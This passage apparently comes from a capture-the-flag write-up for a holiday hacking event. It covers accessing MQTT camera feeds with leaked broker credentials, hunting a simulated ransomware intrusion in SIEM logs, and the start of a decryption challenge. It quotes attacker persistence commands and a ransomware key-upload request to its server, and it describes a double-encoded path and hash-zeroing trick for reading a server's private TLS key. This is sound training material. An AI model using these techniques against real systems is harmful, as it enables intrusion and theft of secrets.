here?","text":""},{"location":"objectives/act_3/o11_santa_vision/#silver_1","title":"Silver","text":"<p>With our elf-anon account, we have access to two functions <code>ListUsers</code> and <code>ListRoles</code>. If we simply try to use the <code>elfmonitor</code> and <code>SiteElfMonitorRole</code> as username and password (setting the camera feed server to our current IP and the port to 9001, as found in our earlier scan), we can successfully turn on the cameras.</p> <p>elfmonitor</p>"},{"location":"objectives/act_3/o11_santa_vision/#gold_1","title":"Gold","text":"<p>When we login as the <code>santaSiteAdmin</code> user, the HTTP response includes the headers: <pre><code>BrkrTopic: northpolefeeds\nBrkrUser: santashelper2024\nBrkrPswd: playerSantaHelperPass6057917780\n</code></pre></p> <p>Brkr probably means broker and refers to the MQTT \"broker\". We can confirm this works by using that username and password combination, along with our IP and port 9001 to turn on the cameras.</p> <p>santashelper2024</p>"},{"location":"objectives/act_3/o11_santa_vision/#c-using-the-information-available-to-you-in-the-santavision-platform-subscribe-to-the-frostbitfeed-mqtt-topic-are-there-any-other-feeds-available-what-is-the-code-name-for-the-elves-secret-operation","title":"C: Using the information available to you in the SantaVision platform, subscribe to the frostbitfeed MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?","text":""},{"location":"objectives/act_3/o11_santa_vision/#silver_2","title":"Silver","text":"<p>After turning on the cameras, we can subscribe to a feed. Northpole feeds just shows us Alabaster and Wombley's propaganda pictures. Instead, we should subscribe to <code>frostbitfeeds</code>.</p> <p>I found it easier to switch to a MQTT GUI rather than using the web interface (although you should be able to do it with either). Then you can just subscribe to <code>#</code>, which means all feeds.</p> <p>While watching <code>frostbitfeeds</code>, there's a comment about <code>santafeed</code>, which eventually publishes the message \"Sixteen elves launched operation: Idemcerybu\"</p> <p>Extra information</p> <p>In frostbitfeeds, we see some interesting messages: </p> <p>\"Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key\"</p> <p>and</p> <p>\"Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot//deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley\" <p>Both led me on wild goose chases because they're not relevant to this challenge. They are relevant, though.</p> <p>Idemcerybu</p>"},{"location":"objectives/act_3/o11_santa_vision/#gold_2","title":"Gold","text":"<p>Taking the silver answer, Sixteen seems oddly specific. And the name isn't readable and also doesn't look like any familiar encoding.</p> <p>Decode's cipher identifier was rather unhelpful, but prompting AI eventually lead to the suggestion of trying a Caesar Cipher. Caesar cipher's can be brute-forced, and Idemcerybu shifted by 16 gives us our answer:</p> <p>Snowmobile</p>"},{"location":"objectives/act_3/o11_santa_vision/#d-there-are-too-many-admins-demote-wombley-and-alabaster-with-a-single-mqtt-message-to-correct-the-northpolefeeds-feed-what-type-of-contraption-do-you-see-santa-on","title":"D: There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the northpolefeeds feed. What type of contraption do you see Santa on?","text":""},{"location":"objectives/act_3/o11_santa_vision/#silver_3","title":"Silver","text":"<p>While watching our MQTT feeds, we see a message about 'singleAdminMode' being disabled and 'superAdminMode' being enabled. Presumably we need to change one of these.</p> <p>After logging in with our silver accounts from parts A and B, we're shown a form for publishing messages. Publishing <code>singleAdminMode=true</code> gives us an error about not being allowed to publish to this feed with the HTML form.</p> <p>If we publish instead to <code>santafeed</code>, we get no error and the following message is published on <code>northpolefeeds</code>:</p> Images <p>./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-1.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-2.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-3.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-4.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-5.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-6.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-7.png,./static/images/hhc2024santatopsecreteasyimages376919542/santa376919542-8.png</p> <p>pogo stick</p> <p>These images show Santa riding a pogo stick</p>"},{"location":"objectives/act_3/o11_santa_vision/#gold_3","title":"Gold","text":"<p>If we use our gold accounts from A and B, the HTML form isn't shown. We can manually remove the CSS that hides it to show the form:</p> <p></p> <p>It's interesting that the error message specifically says we're not allowed to publish to the feed with this HTML form. What if we don't use the HTML form, and instead run the JavaScript code directly: <pre><code>mqtt.send(\"santafeed\", \"singleAdminMode=true\", 1, false)\n</code></pre></p> <p>That gives us another northpolefeeds message with the URL paths:</p> Images <p>./static/images/hhc2024santatopsecretimages835826406/santa835826406-1.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-2.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-3.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-4.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-5.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-6.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-7.png,./static/images/hhc2024santatopsecretimages835826406/santa835826406-8.png</p> <p>hovercraft</p> <p>Now Santa is riding a hovercraft</p>"},{"location":"objectives/act_3/o11_santa_vision/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Great work! You've taken the first step\u2014nicely done. You're on the silver path and off to a strong start!</p> <p>Impressive! You dug deeper and uncovered something hidden\u2014very strategic work. You're well on your way to gold!</p> <p>You've gained access, but there's still much more to uncover. Patience and persistence will guide you\u2014silver or gold, you're making progress!</p> <p>Now that you're in, it's time to go deeper. We need access to the northpolefeeds. This won't work if you use Wombley or Alabaster's credentials\u2014find the right user to log in.</p> <p>(Silver hint) Trust your instincts. Even the smallest changes in code or headers could be your way forward.</p> <p>Wonderful job! You've uncovered a critical piece of the puzzle\u2014well on track with the silver approach!</p> <p>(Gold hint) Sometimes the answers are in the quiet moments. Pay attention to every feed and signal\u2014you may find what you're looking for hidden deep in the streams.</p> <p>You're almost there! The operation's code is unlocked, but the final challenge is waiting. Silver or gold, you're close to victory!</p> <p>It's time to take back control of the Santa Broadcast Network. There really shouldn't be multiple administrators\u2014send the right message, and Santa's true spirit will return. What's Santa test-driving this season?</p> <p>Excellent! You've successfully removed the propaganda and restored the true spirit of the season. A solid silver finish\u2014well done!</p> <p>(Gold hint) Think about the kind of ride Santa would take in a world filled with innovation. His vehicle of choice might surprise you\u2014pay attention to the futuristic details.</p> <p>Phenomenal! You've figured it out\u2014Santa's on a new ride. You've earned your gold badge with this one!</p> <p>Mission accomplished! The airwaves are restored, and the message is one of unity and teamwork. Whether silver or gold, you've done an incredible job!</p>"},{"location":"objectives/act_3/o12_elf_stack/","title":"Elf Stack","text":"<p>Official Difficulty: </p> <p>My Difficulty Rating: </p>"},{"location":"objectives/act_3/o12_elf_stack/#objective","title":"Objective","text":"<p>Request</p> <p>Help the ElfSOC analysts track down a malicious attack against the North Pole domain.</p> Fitzy Shortstack <p>Greetings! I'm the genius behind the North Pole Elf Stack SIEM. And oh boy, we've got a situation on our hands.</p> <p>Our system was attacked\u2014Wombley's faction unleashed their FrostBit ransomware, and it's caused a digital disaster.</p> <p>The logs are a mess, and Wombley's laptop\u2014the only backup of the Naughty-Nice List\u2014was smashed to pieces.</p> <p>Now, it's all up to you to help me trace the attack vectors and events. We need to figure out how this went down before it's too late.</p> <p>You'll be using a containerized ELK stack or Linux CLI tools. Sounds like a fun little puzzle, doesn't it?</p> <p>Your job is to analyze these logs... think of it as tracking snow tracks but in a digital blizzard.</p> <p>If you can find the attack path, maybe we can salvage what's left and get Santa's approval.</p> <p>Santa's furious at the faction fighting, and he's disappointed. We have to make things right.</p> <p>So, let's show these attackers that the North Pole's defenses are no joke!</p>"},{"location":"objectives/act_3/o12_elf_stack/#hints","title":"Hints","text":"Elf Stack Intro <p>I'm part of the ElfSOC that protects the interests here at the North Pole. We built the Elf Stack SIEM, but not everybody uses it. Some of our senior analysts choose to use their command line skills, while others choose to deploy their own solution. Any way is possible to hunt through our logs!</p> Elf Stack Fields <p>If you are using your command line skills to solve the challenge, you might need to review the configuration files from the containerized Elf Stack SIEM.</p> Elf Stack Hard - Email 1 <p>I was on my way to grab a cup of hot chocolate the other day when I overheard the reindeer talking about playing games. The reindeer mentioned trying to invite Wombley and Alabaster to their games. This may or may not be great news. All I know is, the reindeer better create formal invitations to send to both Wombley and Alabaster.</p> Elf Stack Hard - Email 2 <p>Some elves have tried to make tweaks to the Elf Stack log parsing logic, but only a seasoned SIEM engineer or analyst may find that task useful.</p> Elf Stack WinEvent <p>One of our seasoned ElfSOC analysts told me about a great resource to have handy when hunting through event log data. I have it around here somewhere, or maybe it was online. Hmm.</p> Elf Stack PowerShell <p>Our Elf Stack SIEM has some minor issues when parsing log data that we still need to figure out. Our ElfSOC SIEM engineers drank many cups of hot chocolate figuring out the right parsing logic. The engineers wanted to ensure that our junior analysts had a solid platform to hunt through log data.</p>"},{"location":"objectives/act_3/o12_elf_stack/#solution","title":"Solution","text":"<p>After downloading the three files, we must extract the elf-stack-siem and then move the two log  zips into its folder. Run <pre><code>docker compose up setup\ndocker compose up\n</code></pre></p> <p>We can then open http://localhost:5601/app/home and use the credentials elastic / ELFstackLogin! to log in (as found in the .env file)</p>"},{"location":"objectives/act_3/o12_elf_stack/#easy","title":"Easy","text":"<ul> <li> <p>Question 1: How many unique values are there for the event_source field in all logs?</p> <p>Analytics &gt; Dashboard &gt; Create new &gt; Create visualisation &gt; Drag event_source.</p> <p>This shows that there are 5</p> </li> <li> <p>Question 2: Which event_source has the fewest number of events related to it?</p> <p>Shown in previous view: AuthLog</p> </li> <li> <p>Question 3: Using the event_source from the previous question as a filter, what is the field name that contains the name of the system the log event originated from?</p> <p>Go to Analytics &gt; discover &gt; event_source : \"AuthLog\" </p> <p>event.hostname</p> </li> <li> <p>Question 4: Which event_source has the second highest number of events related to it?</p> <p>Use the first analytics dashboard to see it's NetflowPmacct</p> </li> <li> <p>Question 5: Using the event_source from the previous question as a filter, what is the name of the field that defines the destination port of the Netflow logs?</p> <p>Go to Analytics &gt; discover &gt; event_source : \"NetflowPmacct\"</p> <p>event.port_dst</p> </li> <li> <p>Question 6: Which event_source is related to email traffic?</p> <p>We can guess this based on the event sources we saw in question one: SnowGlowMailPxy</p> </li> <li> <p>Question 7: Looking at the event source from the last question, what is the name of the field that contains the actual email text?</p> <p>event.Body</p> </li> <li> <p>Question 8: Using the 'GreenCoat' event_source, what is the only value in the hostname field?</p> <p>SecureElfGwy</p> </li> <li> <p>Question 9: Using the 'GreenCoat' event_source, what is the name of the field that contains the site visited by a client in the network?</p> <p>event.url</p> </li> <li> <p>Question 10: Using the 'GreenCoat' event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?</p> <p>Click \"field statistics\" and add \"event.url\" and \"event.port\"</p> <p>pagead2.googlesyndication.com:443</p> </li> <li> <p>Question 11: Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?</p> <p>I don't really know what this means, but there's 5 distinct event.Correlation_ActivityID s. Or 5 \"event.channel\"s if you don't filter on WindowsEvent 5</p> </li> <li> <p>Question 12: What is the name of the event.Channel (or Channel) with the second highest number of events?</p> <p>Microsoft-Windows-Sysmon/Operational</p> </li> <li> <p>Question 13: Our environment is using Sysmon to track many different events on Windows systems. What is the Sysmon Event ID related to loading of a driver?</p> <p>We solve this by googling: 6</p> </li> <li> <p>Question 14: What is the Windows event ID that is recorded when a new service is installed on a system?</p> <p>Once again, this is a question for Google.</p> <p>4697</p> </li> <li> <p>Question 15: Using the WindowsEvent event_source as your initial filter, how many user accounts were created?</p> <p>We find this by using the following search: <code>event_source : \"WindowsEvent\" and event.EventID : 4720</code> (after googling for the event id).</p> <p>0</p> </li> </ul>"},{"location":"objectives/act_3/o12_elf_stack/#hard","title":"Hard","text":"<ul> <li> <p>Question 1: What is the event.EventID number for Sysmon event logs relating to process creation?</p> <p>We use Google to find it is 1</p> </li> <li> <p>Question 2: How many unique values are there for the 'event_source' field in all of the logs?</p> <p>5 (See easy mode)</p> </li> <li> <p>Question 3: What is the event_source name that contains the email logs?</p> <p>SnowGlowMailPxy (see easy mode)</p> </li> <li> <p>Question 4: The North Pole network was compromised recently through a sophisticated phishing attack sent to one of our elves. The attacker found a way to bypass the middleware that prevented phishing emails from getting to North Pole elves. As a result, one of the Received IPs will likely be different from what most email logs contain. Find the email log in question and submit the value in the event 'From:' field for this email log event.</p> <p>Looking at the event.ReceivedIP1, all are from a single IP. event.ReceivedIP2 has two IPs; almost all are from one (which means its probably legit, unless the attacker sent lots of emails and  the elves all use TikTok or something) so filter on the second:</p> <p><code>event_source : \"SnowGlowMailPxy\" and event.ReceivedIP2 : \"34.30.110.62\"</code></p> <p>kriskring1e@northpole.local</p> </li> <li> <p>Question 5: Our ElfSOC analysts need your help identifying the hostname of the domain computer that established a connection to the attacker after receiving the phishing email from the previous question. You can take a look at our GreenCoat proxy logs as an event source. Since it is a domain computer, we only need the hostname, not the fully qualified domain name (FQDN) of the system.</p> <p>In the body, we can see the link provided is http://hollyhaven.snowflake/howtosavexmas.zip so we can use this to search:</p> <p><code>event_source : \"GreenCoat\" and event.url :  \"http://hollyhaven.snowflake/howtosavexmas.zip\"</code></p> <p>SleighRider</p> </li> <li> <p>Question 6: What was the IP address of the system you found in the previous question?</p> <p>172.24.25.12</p> </li> <li> <p>Question 7: A process was launched when the user executed the program AFTER they downloaded it. What was that Process ID number (digits only please)?</p> <p>time filter</p> <p>For the rest of the questions, until otherwise noted, we will filter to times after the event used for question 6 and 7, and order by time.</p> <p><code>event_source : \"WindowsEvent\" and event.EventID : \"1\" and (event.Hostname : \"SleighRider.northpole.local\" or event.Hostname : \"SleighRider\")</code></p> <p>10014</p> </li> <li> <p>Question 8: Did the attacker's payload make an outbound network connection? Our ElfSOC analysts need your help identifying the destination TCP port of this connection.</p> <p><code>event.SourceIp : \"172.24.25.12\"</code>. Note that the oldest log has event.Image     C:\\Users\\elf_user02\\Downloads\\howtosavexmas\\howtosavexmas.pdf.exe so it's the log we want.</p> <p>8443</p> </li> <li> <p>Question 9: The attacker escalated their privileges to the SYSTEM account by creating an inter-process communication (IPC) channel. Submit the alpha-numeric name for the IPC channel used by the attacker.</p> <p><code>event.ProcessID : \"10014\"</code> shows the process setting REGISTRY KEYS etc before running <code>cmd.exe /c echo ddpvccdbr &amp;gt; \\\\\\\\.\\\\pipe\\\\ddpvccdbr</code> (on the 34th action). So the answer is ddpvccdbr</p> </li> <li> <p>Question 10: The attacker's process attempted to access a file. Submit the full and complete file path accessed by the attacker's process.</p> <p><code>event.Hostname : \"SleighRider.northpole.local\" and event.EventID : \"4663\" and event.ProcessName : \"C:\\Users\\elf_user02\\Downloads\\howtosavexmas\\howtosavexmas.pdf.exe\"</code></p> <p>C:\\Users\\elf_user02\\Desktop\\kkringl315@10.12.25.24.pem</p> </li> <li> <p>Question 11: The attacker attempted to use a secure protocol to connect to a remote system. What is the hostname of the target server?</p> <p>The previous action seemed to be saving an SSH key, so searching for \"ssh\" finds messages to kringleSSleigH</p> </li> <li> <p>Question 12: The attacker created an account to establish their persistence on the Linux host. What is the name of the new account created by the attacker?</p> <p>Searching for logs around that time with <code>event.hostname : \"kringleSSleigH\"</code> finds an event: <code>kkringl315 : TTY=pts/5 ; PWD=/opt ; USER=root ; COMMAND=/usr/sbin/adduser ssdh</code></p> <p>ssdh</p> </li> <li> <p>Question 13: The attacker wanted to maintain persistence on the Linux host they gained access to and executed multiple binaries to achieve their goal. What was the full CLI syntax of the binary the attacker executed after they created the new user account?</p> <p>Filtering for the hostname after the user was added and sorting by time, we see the attacker setting up the user's password, etc, and then they run kkringl315 : TTY=pts/5 ; PWD=/opt ; USER=root ; COMMAND=/usr/sbin/usermod -a -G sudo ssdh. /usr/sbin/usermod -a -G sudo ssdh</p> </li> <li> <p>Question 14: The attacker enumerated Active Directory using a well known tool to map our Active Directory domain over LDAP. Submit the full ISO8601 compliant timestamp when the first request of the data collection attack sequence was initially recorded against the domain controller.</p> <p>Search for ldap bind event: <code>event.EventID : \"2889\"</code> and then use the event.date field 2024-09-16T11:10:12-04:00</p> </li> <li> <p>Question 15: The attacker attempted to perform an ADCS ESC1 attack, but certificate services denied their certificate request. Submit the name of the software responsible for preventing this initial attack.</p> <p>Search for certificate denied event: <code>event.EventID : \"4888\"</code></p> <p>KringleGuard</p> </li> <li> <p>Question 16: We think the attacker successfully performed an ADCS ESC1 attack. Can you find the name of the user they successfully requested a certificate on behalf of?</p> <p>Searching <code>event.EventID : \"4886\"</code>  shows the name nutcrakr</p> </li> <li> <p>Question 17: One of our file shares was accessed by the attacker using the elevated user account (from the ADCS attack). Submit the folder name of the share they accessed.</p> <p>We can search with <code>event.EventID : \"5140\" and  \"nutcrakr\"</code> to find the file share is</p> <p>WishLists</p> </li> <li> <p>Question 18: The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?</p> <p><code>event.EventID : \"4104\" and event.Computer : \"SleighRider.northpole.local\"</code></p> <p>fR0s3nF1@k3_s</p> </li> <li> <p>Question 19: The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?</p> <p>For this, we need the logon type for RDP. We can then use it to search:</p> <p><code>event.LogonType : \"10\" and event.Hostname : \"dc01.northpole.local\"</code></p> <p>2024-09-16T15:35:57.000Z</p> </li> <li> <p>Question 20: The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?</p> <p>There are no signs of file creations or files transferred if we use eventID. Instead, we have to  look through the processes the attacker ran with <code>event.EventID : \"1\" and event.Hostname : \"dc01.northpole.local\" and event.User : \"NORTHPOLE\\\\nutcrakr\"</code></p> <p>This shows the attacker creating a new file with Notepad: <code>\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\WishLists\\santadms_only\\its_my_fakelst.txt</code></p> <p>C:\\WishLists\\santadms_only\\its_my_fakelst.txt</p> </li> <li> <p>Question 21: The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?</p> <p>remove the time filter</p> <p>There's probably a smarter way to do this, but I'm only used to Splunk, so I just used the visualisation of <code>event_source : \"SnowGlowMailPxy\"</code> and counted the wombley like email addresses. There are 4</p> </li> <li> <p>Question 22: The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?</p> <p>We can use the following query: <code>event_source : \"SnowGlowMailPxy\" and (event.To : \"wcub101@northpole.local\" or event.To : \"wcub303@northpole.local\" or event.To : \"wcub808@northpole.local\" or event.To : \"wcube311@northpole.local\" ) and (event.From : \"asnowball04@northpole.local\" or event.From : \"asnowball08@northpole.local\" or event.From : \"asnowball09@northpole.local\" or event.From : \"asnowball_05@northpole.local\" )</code> to see there are 22</p> </li> <li> <p>Question 23: Of all the reindeer, there are only nine. What's the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.</p> <p>I switched to the Lucene search syntax for this since it supports fuzzy search. We're clearly looking for something Rudolph-y, but: <code>event_source:\"SnowGlowMailPxy\" AND event.From:*Rudolph*</code> shows 17 results. Only one of the \"from\"s mentions glow, so the domain must be rud01ph.glow</p> </li> <li> <p>Question 24: With a fiery tail seen once in great years, what's the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.</p> <p>\"Fiery tail seen once in great years\" clearly refers to the reindeer Comet, but filtering for that didn't seem to work (due to the use of numbers instead of letters). Instead, I took the slow approach of filtering out the emails it could not be for with:</p> <p><code>event_source:\"SnowGlowMailPxy\" AND (NOT event.From:*elf*) AND (NOT event.From:*northpole.local)</code> and then just looked through the remaining emails to see it must refer to c0m3t.halleys</p> </li> </ul>"},{"location":"objectives/act_3/o12_elf_stack/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>Fantastic job! You worked through the logs using the ELK stack like a pro\u2014efficient, quick, and spot-on. Maybe, just maybe, this will turn Santa's frown upside down!</p> <p>Up for the real challenge? Take a deep dive into those logs and query your way through the chaos. It might be tricky, but I know your adaptable skills will crack it!</p> <p>Unbelievable! You dissected the attack chain using advanced analysis\u2014impressive work! With determination like yours, we might just fix the mess and get Santa smiling again.</p> <p>Bravo! You pieced it all together, uncovering the attack path. Santa's gonna be grateful for your quick thinking and tech savvyness. The North Pole owes you big time!</p>"},{"location":"objectives/act_3/o13_decrypt/","title":"Decrypt the Naughty Nice List","text":"<p>Official Difficulty: </p> <p>My Difficulty Rating: </p>"},{"location":"objectives/act_3/o13_decrypt/#objective","title":"Objective","text":"<p>Request</p> <p>Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.</p> Tangle Coalbox <p>Ah, there ya are, Gumshoe! Tangle Coalbox at yer service. Heard the news, eh? The elves\u2019 civil war took a turn for the worse, and now, things\u2019ve really gone sideways. Someone\u2019s gone and ransomware\u2019d the Naughty-Nice List! And just when you think it can't get worse\u2014turns out, it was none other than ol\u2019 Wombley Cube. He used Frostbit ransomware, all right. But, in true Wombley fashion, he managed to lose the encryption keys! That\u2019s right, the list is locked up tight, and it\u2019s nearly the start of the holiday season. Not ideal, huh? We're up a frozen creek without a paddle, and Santa\u2019s big day is comin\u2019 fast. The whole North Pole\u2019s stuck in a frosty mess, unless\u2014there\u2019s someone out there with the know-how to break us out of this pickle. If I know Wombley\u2014and I reckon I do\u2014he didn't quite grasp the intricacies of Frostbit\u2019s encryption. That gives us a sliver o' hope. If you can crack into that code, reverse-engineer it, we just might have a shot at pullin\u2019 these holidays outta the ice. It\u2019s no small feat, mind ya, but somethin\u2019 tells me you've got the brains to make it happen, Gumshoe. So, no pressure, but if we don\u2019t get this solved, the holidays could be in a real bind. I'm countin\u2019 on ya! And when ya do crack it, I reckon Santa\u2019ll make sure you're on the extra nice list this year. What d\u2019ya say?</p>"},{"location":"objectives/act_3/o13_decrypt/#hints","title":"Hints","text":"Dusty Giftwrap <p>The Frostbit infrastructure might be using a reverse proxy, which may resolve certain URL encoding patterns before forwarding requests to the backend application. A reverse proxy may reject requests it considers invalid. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts. If successful, this could be the key to tricking the Frostbit infrastructure into revealing a secret necessary to decrypt files encrypted by Frostbit.</p> Dusty Giftwrap <p>I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes.</p>"},{"location":"objectives/act_3/o13_decrypt/#solution","title":"Solution","text":""},{"location":"objectives/act_3/o13_decrypt/#part-1-find-the-ransom-note","title":"Part 1: Find the ransom note","text":"<p>Tangle Coalbox gives us a zip folder containing:</p> <ul> <li>DoNotAlterOrDeleteMe.frostbit.json</li> <li>frostbit.elf</li> <li>frostbit_core_dump.13</li> <li>naughty_nice_list.csv.frostbit</li> <li>ransomware_traffic.pcap</li> </ul> <p>Presumably the end goal is to decrypt the <code>naughty_nice_list.csv.frostbit</code>, <code>DoNotAlterOrDeleteMe.frostbit.json</code> doesn't look interesting and the PCAP is just a collection of (encrypted) TLS packets.</p> <p>Reverse engineering</p> <p>Like many, I'm not great at RE, and I think a lot of people are daunted by this challenge for that reason, especially once you open frostbit.elf in Ghidra, and are confronted with a Go monstrosity where even the main function is hard to find.</p> <p>Fortunately, no RE is necessary, so I won't discuss my failed attempts with Ghidra, dynamic analysis or strace, etc.</p> <p>Using <code>strings</code> on <code>frostbit_core_dump.13</code> provides a wealth of information, including the following URLs <pre><code>https://api.frostbit.app/view/sq8PQQrZn3rxXDc2of4f4Q/5f320445-bc8b-4dd6-812d-2e843e5c8e9a/status?digest=a0281081180ce180a12250815008a004\nPOST /api/v1/bot/5f320445-bc8b-4dd6-812d-2e843e5c8e9a/key HTTP/2\nHost: api.frostbit.app\nUser-Agent: Go-http-client/1.1\nContent-Length: 1059\nContent-Type: application/json\nAccept-Encoding: gzip\n\n{\"encryptedkey\": \"62ab37fa5776c858b7aa00b4126fe39ccc5ec80cf75f34b54172514fc1f8b457f6da74d2c935f7c21cfed989ee0ac120ef85eb2daa5a2854e6c2873415575ee700497ab3691ee2efc9c91d5560814c1e95741944cf79851f66debb8a3672edf78dc7fe87fa9555217c3a8254ab44eb42d7ed66e0c80c6bf8b3217392fb223075b20bffa86511c4a7d3b81f26b15344a2538e3f2ddf43d6f54930c72d3b901921f681a53ccd8119263d7f6afa4b3d8ced35d18dc9af2dcd24e8df100c49570996c91601e7a2c9aab8b8a5d5b61e4e8734ed32bbed807fecf8e8c2031055226fd133b47e3bcad38ed57b0308f0e77a3e2e1a9550d6d876925f1e3654c09a8a37396e5428b688e623e2c08a8e607a1e1c9802b8c681d16f4c9faf378ad4a04ca3bafdbb69656308eadaa5574ac1e16577f6cb40b782c00468478731a19d7e157ec063d81afb25be3232f7419d3341ab5811563ed4a1b102723e66d556a1c30fd3c21672de2889506ab60eb392492a970f2d2ba061bdd78ec65bf154d0f6a6252d4912df15c15f3ef6eed928a5f7c58a1d7b2cccfc0681f0ef1b30250e114c34589f12fbf9a519fab51c6af4e84037bc18daf1d48276f42d88a25814a089f8152770f54177033ecbd5ec1c6f640424ac33fbde406dfe9d2fba29fad6bc41e9abc4edeaf0c9c06fa8867f934a713b9b369886e32188e5ca77e83a255f48eb4a3aea04\",\"nonce\":\"\"}\n\nhttps://api.frostbit.app/api/v1/bot/5f320445-bc8b-4dd6-812d-2e843e5c8e9a/session\nhttps://api.frostbit.app/api/v1/bot/5f320445-bc8b-4dd6-812d-2e843e5c8e9a/keyit\n</code></pre></p> <p>It also provides the TLS keys required to decrypt the PCAP, but there's no real need to do so, since we already have the plaintext request and responses.</p> <p>After testing those URLs, we can rule out <code>/session</code>, <code>/key</code> and <code>/keyit</code> as being reasonably static and thus of minimal interest.</p>"},{"location":"objectives/act_3/o13_decrypt/#part-2-find-the-vulnerability","title":"Part 2: Find the vulnerability","text":"<p>The URL that shows the ransomnote is far more  interesting since the javascript includes a section for debug data. Can we turn it on?</p> <p>Side tracks</p> <p>There's a comment in the code about it being a Python server, so I wasted a fair amount of time trying to determine if there was a template injection or if there was another query parameter I could add. I'm also a bit confused about how the debug parameter works <code>1</code> and <code>true</code> work, as expected, but <code>foo</code> doesn't, even though it's \"truthy\" in Python.</p> <p>The debug value is likely boolean, so there's not too much that can be done with it, but the digest could be used for anything, so what happens if we modify it?</p> <pre><code>Status Id File Digest Validation Error: Traceback (most recent call last):\\n  File \\\"/app/frostbit/ransomware/static/FrostBiteHashlib.py\\\", line 55, in validate\\n  decoded_bytes = binascii.unhexlify(hex_string)\\nbinascii.Error: Odd-length string\\n\n</code></pre> <p>That error message leads us to FrostBiteHashlib.py. This file is checking the digest we provide, but that function doesn't seem to have any vulnerabilities. The compute hash function is more complex, but is it used? One way to check is to modify the file name (which appears to be <code>sq8PQQrZn3rxXDc2of4f4Q</code>), but if we modify it randomly, we simply get a \"Status  Id File not Found\". </p> <p>Fortunately, there's often multiple ways to \"change\" a filename without changing the file - for example, <code>test.txt</code> and <code>./test.txt</code> and <code>../curr_dir/test.txt</code> may all be the same. We don't know the folder name, so we have to try the second option: <code>./sq8PQQrZn3rxXDc2of4f4Q</code></p> <p>URL encoding</p> <p>Often routing works by matching paths and extracting values to pass to the function. This server might be using a route like <code>/view/:status_id/:bot_id/status</code>. If we try to use <code>view/./sq8PQQrZn3rxXDc2of4f4Q/5f320445-bc8b-4dd6-812d-2e843e5c8e9a/status</code>, the server will think the status id is <code>.</code>, the bot ID is <code>sq8PQQrZn3rxXDc2of4f4Q</code> and will then fail because the next bit isn't status. Instead, we need to URL-encode <code>./</code>. This also gives an error, presumably due to the reverse proxy mentioned, so we double-encode.</p> <p></p> <p>Given the file itself hasn't changed, this confirms for us that the hash is being dynamically calculated each request and that the path impacts the hash result. So let's take a closer look at the Python function: <pre><code>def _compute_hash(self) -&gt; bytes:\n    hash_result = bytearray(self.hash_length)\n    count = 0\n\n    for i in range(len(self.file_bytes)):\n        xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]\n        hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd\n        count += 1\n\n    for i in range(len(self.filename_bytes)):\n        count_mod = count % self.hash_length\n        count_filename_mod = count % self.filename_bytes_length\n        count_nonce_mod = count % self.nonce_bytes_length\n        xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]\n        hash_result[count_mod] = hash_result[count_mod] &amp; xrd\n        count += 1\n\n    return bytes(hash_result)\n</code></pre></p> <p>We cannot control the file_bytes, so we can ignore that. We do however know the nonce, and we can control the filename, so these lines are very interesting: <pre><code>xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod] # XOR\nhash_result[count_mod] = hash_result[count_mod] &amp; xrd # AND\n</code></pre> XOR has the wonderful property that anything XOR itself is always 0, and AND has the property where anything AND 0 is zero. Therefore, we just need to setup the filename such that the filename bytes and nonce bytes will line up at some point with themselves.</p> <p>Encodings</p> <p>I got stuck here for far too long. Understanding the vulnerability was simple enough for me, noting that the nonce is hex-encoded was not simple at all. The nonce is only 8 bytes whereas the digest is 16, we also have to duplicate it.</p>"},{"location":"objectives/act_3/o13_decrypt/#part-3-find-the-private-key","title":"Part 3: Find the private key","text":"<p>In Santa Vision, we saw the message on frostbitfeeds <code>Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key</code>. Since we're using api.frostbit.app, that's probably the path we need.</p> <p>We can confirm the file exists since we get \"invalid digest\" as our  error message. So now we just need to use the vulnerability we discovered to set our digest to all 0s.</p> <p>First, we need to use cyberchef to convert the nonce \"From Hex\" (noting we want no delimiter) and then 